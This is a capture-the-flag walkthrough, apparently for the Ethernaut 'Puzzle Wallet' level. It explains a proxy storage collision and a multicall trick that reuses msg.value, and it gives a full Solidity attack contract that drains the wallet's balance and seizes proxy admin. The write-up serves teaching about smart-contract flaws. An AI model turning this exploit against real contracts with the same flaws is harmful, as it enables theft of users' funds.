### Goals

Become admin of the Proxy.

### Exploit

The order of variables in implementation contact should match with proxy contract. This level does not implement that correctly so we will need to exploit this.

Since storage collision exists, setting `PuzzleWallet::maxBalance()` to some address will effectively change the owner of Proxy contract. That's what we will do.

Steps:

1. `PuzzleProxy::proposeNewOwner()` -> will write arbitrary address as pendingOwner but for `Implementation` the slot0 is owner slot. So we will have ownership of the implementation contract.

2. `PuzzleProxy::addToWhitelist()` -> since we are owner now we can addToWhitelist some account to be able to call other functions.

3. Now we can call `setMaxBalance` but this function requires that contract balance is equal to 0. So we will need to purge the contract balance first. The only function that withdraws funds from contract is `execute`. However it does not allow to withdraw more then have been deposited by the sender.

4. Multicall function allows to wrap multiple calls. It does not allow calling deposit twice, to not reuse the `msg.value` (delegatecall forwards also the value send). But does it really? We could do some smart hacking here to bypass this check.

5. After we manage to artificially increase our balance we will be able to withdraw whole PuzzleWallet balance and call other functions for claiming ownership.

### Code

Deploy contract in Remix

```code
contract Evil25 {
    IPuzzle t = IPuzzle(YOUR_INSTANCE_ADDRESS);

    function pwn() external payable {
        // set this address as owner in implementation
        t.proposeNewAdmin(address(this));

        // add to whitelist so we can call other functions
        t.addToWhitelist(address(this));

        // deposit funds so we can call execute
        t.deposit{value: 0.001 ether}();


        // call multicall with special payload which calls deposit, then calls multicall again with deposit thus bypassing check on `deposit`. The contract balance starts with 0.001 eth so we will need to only call deposit once more, to forge our balance.

        bytes[] memory data = new bytes[](2);
        bytes[] memory data2 = new bytes[](1);

        data[0] = abi.encodeWithSelector(IPuzzle.deposit.selector);
        data2[0] = abi.encodeWithSelector(IPuzzle.deposit.selector);
        data[1] = abi.encodeWithSelector(IPuzzle.multicall.selector, data2);

        // it will reuse 0.001 ether, so we would deposit 0.002 ether in contract understanding (in total we will end up with 0.003 assuming earlier deposit which will equal to contracts balance)
        t.multicall{value: 0.001 ether}(data);

        // now we can withdraw whole balance
        t.execute(address(this), 0.003 ether, "");

        // since balance is purged we can now call `setMaxBalance` with encoded our address, which for Proxy contract will be admin
        t.setMaxBalance(uint256(uint160(address(this))));

        // lastly approve address(this) as admin
        t.approveNewAdmin(address(this));

        // transfer ownership to user
        t.proposeNewAdmin(msg.sender);
        t.approveNewAdmin(msg.sender);
    }

    // we need to be able to receive funds from PuzzleWallet
    receive() external payable {}
}
```

Deploy contract and top-up with 0.002 eth (could also modify pwn as payable) and call `pwn`

Done!
